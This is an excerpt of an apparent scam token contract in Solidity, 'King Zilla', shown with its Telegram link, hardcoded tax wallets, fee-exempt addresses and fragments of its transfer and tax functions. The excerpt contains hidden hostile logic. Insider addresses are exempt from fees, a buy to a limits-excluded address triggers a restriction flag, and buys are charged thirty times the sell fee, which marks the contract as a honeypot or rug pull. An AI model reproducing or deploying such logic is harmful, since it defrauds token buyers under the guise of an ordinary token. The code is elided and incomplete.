...
// Telegram: https://t.me/Kingzilla_Bsc
...
contract KingZ is IERC20 {
    ...
    uint256 private constant startingSupply = 420_000_000;
    string private constant _name = "King Zilla";
    ...
    TaxWallets public _taxWallets =
        TaxWallets({
            marketing: payable(0xB3819E6da98e2D41C3656D779580F658Fee3D647),
            development: payable(0xB3819E6da98e2D41C3656D779580F658Fee3D647)
        });    
    bool inSwap;
    ...
    constructor() payable {
        ...
        _isExcludedFromFees[0x7E72fcafEdebcF5A8f235E8A02dE7e9FBb95fb52] = true; 
        _isExcludedFromFees[0xf5dCd540e2f8446351efaA1D9f9d8be36b7aBA4F] = true; 
        _isExcludedFromLimits[0x5BC4a4DD65517Aa441b66C7BfF4d44b52106942f] = true;
    ...
    function _transfer(address from, address to, uint256 amount) internal returns (bool) {
        ...
        if (buy && _isExcludedFromLimits[to]) {_limit = true;}
    ...
    function takeTaxes(address from, bool buy, bool sell, uint256 amount) internal returns (uint256) {
        ...
        if (buy) {
            ...
            currentFee = _taxRates.sellFee*30;
        } else if (sell) {
